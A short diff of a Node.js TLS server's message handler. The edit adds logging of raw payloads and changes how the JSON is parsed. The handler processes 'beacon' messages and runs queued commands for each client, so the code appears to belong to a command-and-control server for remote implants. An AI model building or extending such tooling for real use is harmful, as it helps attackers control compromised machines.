@@ -62,9 +62,9 @@ const server = tls.createServer({
 
     socket.on('data', async (chunk) => {
         const payloadStr = chunk.toString('utf8');
-
+        console.log(payloadStr);
         try {
-            const response = JSON.parse(payloadStr);
+            const response = (JSON.parse(payloadStr)).response;
             if (response.beacon) {
                 handleBeacon(response, client);
                 await executeQueuedCommands(client);
